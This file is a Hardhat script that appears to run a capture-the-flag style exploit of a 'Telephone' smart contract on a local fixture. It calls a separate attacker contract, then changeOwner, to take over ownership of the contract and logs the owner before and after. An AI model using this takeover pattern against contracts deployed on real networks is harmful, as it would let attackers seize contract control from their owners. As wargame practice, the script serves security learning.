const { deployments, ethers, getNamedAccounts } = require("hardhat")


async function main() {

  let telephone
  let deployer
  let player


  deployer = (await getNamedAccounts()).deployer
  player = (await getNamedAccounts()).player

  await deployments.fixture(["telephone"])
  telephone = await ethers.getContract("Telephone", deployer)
  hackTelephone = await ethers.getContract("HackTelephone", player)

  let owner
  owner = await telephone.owner();
  console.log("cp1 onwer: ", owner);
  console.log("cp1 player: ", player);

  const tt = await hackTelephone.getOwnership();
  const tx = await telephone.changeOwner(player);


  owner = await telephone.owner();
  console.log("cp2 onwer: ", owner);
  console.log("cp1 player: ", player);
  // console.log(rc);


}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
